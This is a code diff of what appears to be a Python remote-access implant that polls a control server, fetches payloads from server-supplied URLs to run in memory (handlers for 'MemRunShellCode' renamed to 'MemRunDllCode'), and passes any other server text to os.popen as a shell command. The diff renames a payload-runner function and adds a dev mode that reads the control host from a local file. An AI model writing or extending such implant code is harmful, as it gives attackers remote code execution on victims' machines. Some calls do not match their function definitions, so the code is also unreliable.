@@ -16,7 +16,7 @@ def execute_py_implant(url,session):
         except:
             pass
 
-def syscall(url):
+def rundll(url):
     response = session.get(url,headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
     if response.status_code == 200:
         payload = response.text
@@ -32,7 +32,17 @@ def syscall(url):
         except:
             pass
 
-host = "0.0.0.0"
+MODE = "dev"
+
+if MODE=="dev":
+    try:
+        with open('host_describe.abcd',"r") as file:
+            a = file.read()
+        host = a.split("\n")[0]
+    except:
+        pass
+else:
+    host = "0.0.0.0"
 session = requests.Session()
 
 if "id" not in glob.glob("*.*"):
@@ -72,9 +82,9 @@ while True:
                 payload_uri = ':'.join(str(response2.text).split(":")[1:])
                 execute_py_implant(payload_uri,session)
                 skip = True
-            elif "MemRunShellCode:" in str(response2.text):
+            elif "MemRunDllCode:" in str(response2.text):
                 payload_uri = str(response2.text).split(":")[1]
-                syscall(payload_uri,session)
+                rundll(payload_uri,session)
                 skip = True
             else:
                 out = "".join(list(os.popen(str(response2.text))))
